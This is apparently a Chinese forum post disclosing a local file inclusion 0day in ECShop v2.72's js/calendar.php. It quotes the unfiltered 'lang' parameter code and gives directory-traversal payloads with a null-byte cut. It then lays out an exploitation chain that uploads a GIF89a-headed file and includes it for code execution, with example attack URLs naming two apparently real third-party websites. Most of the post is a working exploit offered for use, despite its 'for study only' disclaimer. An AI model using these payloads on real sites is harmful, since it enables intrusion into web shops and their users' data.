@@ -1,0 +1,36 @@
+ecshop最新版(v272) 本地包含漏洞ODAY(鸡肋) 
+2011, January 11, 5:52 PM. oday收藏 Submitted by admin注：发布本文只是出于学习的目的，请勿用无非法用途！
+
+很久前就发现了，今天发布出来吧，其实很简单，就是很多人没有注意这里：
+
+直接看代码：
+js/calendar.php
+
+1.$lang = (!empty($_GET['lang']))
+2.? trim($_GET['lang']) : 'zh_cn';//没有过滤，很明显的包含漏洞 by: ℡Mr.LP
+3. 
+4.if (!file_exists('../languages/' . $lang . '/calendar.php'))
+5.{
+6.$lang = 'zh_cn';
+7.}
+8. 
+9.require(dirname(dirname(__FILE__)) . '/data/config.php');
+10.header('Content-type: application/x-javascript; charset=' . EC_CHARSET);
+11. 
+12.include_once('../languages/' . $lang . '/calendar.php');//这里包含，需要截断 by: ℡Mr.
+复制代码
+测试代码 :
+
+// 需要 magic_quotes_gpc = Off
+
+/js/calendar.php?lang=../index.php%00.（注意后面有个.）by: ℡Mr.LP
+
+利用：
+
+注册用户
+
+然后上传GIF89a头的GIF文件欺骗，
+
+然后包含 如：[img]http://www.lpboke.com/js/calendar.php?lang=../data/feedbackimg/3481601_20120603wibklv.jpg%00.
+
+http://www.careland.com.cn:88/js/calendar.php?lang=../data/feedbackimg/3481601_20120603wibklv.jpg%00.
